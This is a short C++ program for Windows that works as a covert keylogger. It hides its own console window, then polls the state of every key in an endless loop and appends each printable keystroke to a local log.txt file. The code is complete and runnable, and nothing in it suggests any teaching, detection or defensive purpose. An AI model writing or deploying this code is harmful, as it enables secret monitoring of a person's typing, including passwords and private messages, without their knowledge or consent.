#include <iostream>
#include <fstream>
#include <windows.h>

int main() {
    std::ofstream logFile;
    logFile.open("log.txt", std::ios_base::app);  // Open the log file in append mode

    // Check if the file is opened successfully
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file." << std::endl;
        return -1;
    }

    // Hide the console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    char key;
    while (true) {
        // Sleep to reduce CPU usage
        Sleep(10);

        // Check for key state change
        for (key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {  // Key is being pressed
                if (key >= 32 && key <= 127) {
                    logFile << key;  // Log printable keys
                    logFile.flush();  // Ensure it's written to the file immediately
                }
            }
        }
    }

    logFile.close();  // Never reached
    return 0;
}
